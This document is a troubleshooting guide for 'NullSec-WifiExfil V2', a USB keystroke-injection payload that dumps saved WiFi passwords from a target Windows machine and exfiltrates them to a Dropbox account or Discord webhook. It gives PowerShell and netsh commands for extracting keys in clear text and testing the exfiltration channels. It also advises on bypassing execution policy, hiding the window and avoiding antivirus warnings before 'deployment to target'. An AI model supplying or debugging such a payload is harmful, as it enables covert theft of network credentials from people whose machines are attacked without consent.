# Troubleshooting Guide - NullSec-WifiExfil V2

## 🔍 Common Issues & Solutions

---

## Dropbox Issues

### ❌ 401 Unauthorized / Invalid Token

**Problem:** Payload fails with 401 error

**Causes:**
- Token is incorrect/incomplete
- Token was revoked
- Token expired

**Solutions:**
1. Verify token is copied **completely** (should be 100+ characters)
2. Check for extra spaces or line breaks
3. Generate a new token:
   - Go to https://www.dropbox.com/developers/apps
   - Select your app
   - Click Settings → OAuth 2
   - Click "Revoke" on old token
   - Click "Generate" for new token
4. Update payload with new token
5. Test with PowerShell script first

---

### ❌ 403 Forbidden / Permission Denied

**Problem:** Upload fails - no permission to create files

**Causes:**
- App permissions not set correctly
- Didn't accept permission changes

**Solutions:**
1. Verify permissions are enabled:
   - Go to https://www.dropbox.com/developers/apps
   - Select your app → Permissions tab
   - Check these are enabled:
     - ✅ `files.metadata.write`
     - ✅ `files.content.write`
     - ✅ `files.content.read` (optional)
   - Click Submit if changes made
2. Wait 30 seconds for changes to apply
3. Generate new token after permission changes
4. Update payload and test again

---

### ❌ 404 File Not Found / Path Error

**Problem:** Can't upload - path is invalid

**Causes:**
- Path format incorrect
- Folder doesn't exist (usually auto-created)

**Solutions:**
1. Check `#DROPBOX_PATH` format:
   ```
   ✓ Correct:   /payloads/wifi-logs
   ✗ Wrong:     \payloads\wifi-logs   (Windows path)
   ✗ Wrong:     payloads/wifi-logs    (missing leading /)
   ✗ Wrong:     /payloads/wifi-logs/  (trailing slash)
   ```
2. Use forward slashes `/` not backslashes `\`
3. Don't include trailing slashes
4. Must start with `/`

---

### ❌ Network Error / Connection Timeout

**Problem:** "Connection refused" or timeout

**Causes:**
- Target machine has no internet
- Firewall blocking Dropbox API
- DNS not resolving dropboxapi.com

**Solutions:**
1. Verify target has internet access
2. Test connectivity:
   ```powershell
   Test-NetConnection -ComputerName dropboxapi.com -Port 443
   ```
3. Check firewall allows HTTPS (port 443) to dropboxapi.com
4. Try from different network
5. Test token validity first with simpler script

---

### ❌ File Upload Success But File Not Appearing

**Problem:** Payload reports success but no file in Dropbox

**Causes:**
- File uploaded to wrong folder
- Dropbox sync delay
- Browser cache issue

**Solutions:**
1. Refresh your browser (Ctrl+F5 hard refresh)
2. Check Dropbox app on computer (syncing may be delayed)
3. Search for filename in Dropbox:
   - Click Search in Dropbox
   - Search: `wifi-creds-`
4. Check browser's Downloads folder (didn't auto-download)
5. Verify correct app is being used (not main account)

---

## Discord Issues

### ❌ 404 Webhook Not Found

**Problem:** Message fails to send to Discord

**Causes:**
- Webhook was deleted
- Wrong webhook URL
- Webhook ID/token incorrect

**Solutions:**
1. Verify webhook URL matches what you copied:
   ```
   ✓ Correct: https://discordapp.com/api/webhooks/123456789/AbCdEf...
   ✗ Wrong:   https://discordapp.com/webhooks/...  (missing /api)
   ✗ Wrong:   http://... (must be https)
   ```
2. Check for extra spaces or line breaks
3. Create a new webhook:
   - Go to Discord Server Settings
   - Integrations → Webhooks
   - Delete old webhook
   - Create new webhook
   - Copy new URL
4. Update payload and test again

---

### ❌ Message Doesn't Appear in Discord

**Problem:** Payload runs but message never shows

**Causes:**
- Message sent to wrong channel
- Discord channel doesn't exist
- Permissions issue
- Silent failure

**Solutions:**
1. Verify channel exists and you're looking at correct one
2. Check you have permission to view the channel
3. Test webhook with simple PowerShell:
   ```powershell
   $webhook = 'YOUR_WEBHOOK_URL'
   $test = @{content='Test'} | ConvertTo-Json
   Invoke-RestMethod -Uri $webhook -Method Post `
     -ContentType 'application/json' -Body $test
   ```
4. Look for error response from webhook
5. Check Discord's server status (outage?)

---

### ❌ Message Appears Multiple Times / Duplicates

**Problem:** Credentials posted 2+ times to Discord

**Causes:**
- Payload executed multiple times
- Script ran with different parameters
- Webhook triggered by accident

**Solutions:**
1. Check USB Ducky didn't plug in twice
2. Verify only one instance of PowerShell running
3. Manual test - delete duplicate messages
4. Check script execution logs if available

---

## General Issues

### ❌ PowerShell Command Too Long / Encoding Issues

**Problem:** Payload won't flash or executes incorrectly

**Causes:**
- Line too long (DuckyScript has limits)
- Special characters corrupted
- File encoding wrong

**Solutions:**
1. Verify file is saved as **UTF-8** (not UTF-16 or ANSI):
   - In text editor: File → Save As
   - Choose encoding: UTF-8
2. Don't edit in Word (use Notepad++, VS Code, etc.)
3. Check for non-ASCII characters
4. Split if absolutely necessary (advanced)

---

### ❌ No WiFi Credentials Extracted

**Problem:** Payload runs but shows "(no key)" for everything

**Causes:**
- Target machine has no saved WiFi networks
- No passwords stored (all open networks)
- User doesn't have permission to view passwords
- Admin privileges needed

**Solutions:**
1. Test on computer with known saved WiFi networks
2. Verify user has saved WiFi credentials:
   ```powershell
   netsh wlan show profiles
   ```
3. May require admin privileges:
   - Target needs to run as Administrator
   - Or network admin settings prevent viewing
4. Test with admin account first
5. Some enterprise WiFi doesn't store passwords locally

---

### ❌ PowerShell Execution Policy Error

**Problem:** "Cannot be loaded because running scripts is disabled"

**Causes:**
- PowerShell execution policy set to "Restricted"
- Script signing required

**Solutions:**
1. Payload includes `-ExecutionPolicy Bypass` flag - should override
2. If still fails, payload doesn't run at all (not execution)
3. Try running as Administrator
4. Check Group Policy (enterprise machines)

---

### ❌ Hidden Window Doesn't Hide

**Problem:** PowerShell window appears visibly

**Causes:**
- `-WindowStyle Hidden` not working
- Antivirus blocking hidden execution
- PowerShell version issue

**Solutions:**
1. Usually not a problem - just looks bad
2. Window closes quickly anyway
3. If persistent, antivirus might be blocking
4. Test on different machine

---

## Testing Checklist

Before deploying to target:

- [ ] Token/webhook URL copied completely (no spaces)
- [ ] File saved as UTF-8 encoding
- [ ] Token/webhook tested in PowerShell first
- [ ] Payload runs on test machine
- [ ] Credentials extracted correctly
- [ ] Upload/send succeeds
- [ ] Files appear in Dropbox OR message appears in Discord
- [ ] No antivirus warnings
- [ ] Ready for deployment

---

## Advanced Debugging

### Enable Error Logging

Modify payload to save error output:

```powershell
# Add this to capture all errors to file
$logfile = "$env:TEMP\wifi-exfil-debug.txt"
$ErrorActionPreference='Continue'
Start-Transcript -Path $logfile -Append
# ... rest of script ...
Stop-Transcript
```

Then check `C:\Users\[username]\AppData\Local\Temp\wifi-exfil-debug.txt`

---

### Manual PowerShell Test

Test each component separately:

```powershell
# 1. Test WiFi enumeration
netsh wlan show profiles

# 2. Test specific network
netsh wlan show profile name="HomeNetwork" key=clear

# 3. Test Dropbox token
$token = 'YOUR_TOKEN'
$headers = @{'Authorization' = "Bearer $token"}
Invoke-RestMethod -Uri 'https://www.dropboxapi.com/2/users/get_current_account' -Headers $headers

# 4. Test Discord webhook
$webhook = 'YOUR_WEBHOOK_URL'
$payload = @{content='Test'} | ConvertTo-Json
Invoke-RestMethod -Uri $webhook -Method Post -ContentType 'application/json' -Body $payload
```

---

## Still Having Issues?

If none of these solutions work:

1. **Check payload file syntax** - make sure no typos
2. **Test in stages** - verify each component works
3. **Check encoding** - must be UTF-8
4. **Try simpler payload** - test basic WiFi enum first
5. **Different network** - test on different WiFi/internet
6. **Update DuckyScript** - ensure latest firmware
7. **Check logs** - any error messages?

---

## Version Information

- **Payload Version:** 2.0
- **Last Updated:** 2026-05-07
- **Tested On:** Windows 10/11
- **PowerShell:** 5.0+

---
